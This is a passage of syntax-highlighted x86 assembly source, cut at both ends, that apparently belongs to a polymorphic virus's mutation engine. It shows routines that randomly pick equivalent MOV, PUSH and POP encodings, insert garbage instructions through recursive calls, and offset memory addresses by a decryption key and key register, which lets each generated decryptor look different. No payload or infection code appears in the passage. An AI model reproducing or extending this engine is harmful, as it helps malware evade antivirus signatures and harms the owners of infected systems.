       </span><span class="sc5">@@MOV</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C089h</span><span class="sc0"> </span><span class="sc1">; Opcode of MOV Reg,Reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@MOV_2</span><span class="sc0">      </span><span class="sc1">; Random jump (to avoid alternative opcode)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Make 8B C0 as instruction, so...</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">     </span><span class="sc1">; ...we have to exchange source and destiny</span><span class="sc0">
       </span><span class="sc5">@@MOV_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">      </span><span class="sc1">; Set the registers to the opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">              </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">        </span><span class="sc1">; Jump to return</span><span class="sc0">

   </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MOV</span><span class="sc0">

        </span><span class="sc5">EndRecursiveMOVing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">; Conserve EDI</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoMOVRegReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">MOVingRecursLevel</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Returns: EBX=Address to use</span><span class="sc0">
</span><span class="sc1">;;          The returned address is reserved for prevent its using.</span><span class="sc0">
</span><span class="sc1">;;          If there are no more free memory variables, then EBX=0</span><span class="sc0">
</span><span class="sc5">GetAndReserveVar</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_F</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Found</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
     </span><span class="sc5">@@Loop02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ReturnError</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Loop01</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop02</span><span class="sc0">
     </span><span class="sc5">@@Found</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_F</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc5">@@ReturnError</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAndReserveVar</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; In: EBX=Reserved memory address to "unlock"</span><span class="sc0">
</span><span class="sc1">;; Returns: Nothing (even if there's an error)</span><span class="sc0">
</span><span class="sc5">ReleaseVar</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
     </span><span class="sc5">@@Loop01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_Addr</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Found</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc5">@@Loop01</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@Found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">ReservedMemVars_F</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ReleaseVar</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; DL=Register to PUSH</span><span class="sc0">
</span><span class="sc5">DoPUSHReg</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@DirectPUSH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectPUSH</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectPUSH</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

     </span><span class="sc5">@@DirectPUSH</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">
</span><span class="sc5">DoPUSHReg</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoPOPReg</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@DirectPOP</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectPOP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

   </span><span class="sc5">@@DirectPOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">
</span><span class="sc5">DoPOPReg</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; In: EBX=Memory address</span><span class="sc0">
</span><span class="sc5">DoPUSHMem</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithIndex</span><span class="sc0">
    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35FFh</span><span class="sc0">
    </span><span class="sc5">CommonWithDoPUSH2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">@@Common</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

   </span><span class="sc5">@@WithIndex</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0FFh</span><span class="sc0">
   </span><span class="sc5">CommonWithDoPUSH</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@ByteAddition</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Common</span><span class="sc0">
    </span><span class="sc5">@@ByteAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3FFFh</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

     </span><span class="sc5">EndOfDoPUSHMem</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoPUSHMem</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoPOPMem</span><span class="sc0">        </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithIndex</span><span class="sc0">
    </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058Fh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CommonWithDoPUSH2</span><span class="sc0">
   </span><span class="sc5">@@WithIndex</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0808Fh</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CommonWithDoPUSH</span><span class="sc0">
</span><span class="sc5">DoPOPMem</span><span class="sc0">        </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoMOVRegMem</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">

    </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRandom</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc0">
    </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPReg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

   </span><span class="sc5">@@DirectMOV</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058Bh</span><span class="sc0">
   </span><span class="sc5">CommonMRMDirectMOV</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

   </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">808Bh</span><span class="sc0">
   </span><span class="sc5">CommonMRMDirectMOV2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Cont_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">CommonMRMDirectMOV</span><span class="sc0">
     </span><span class="sc5">@@Cont_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

   </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
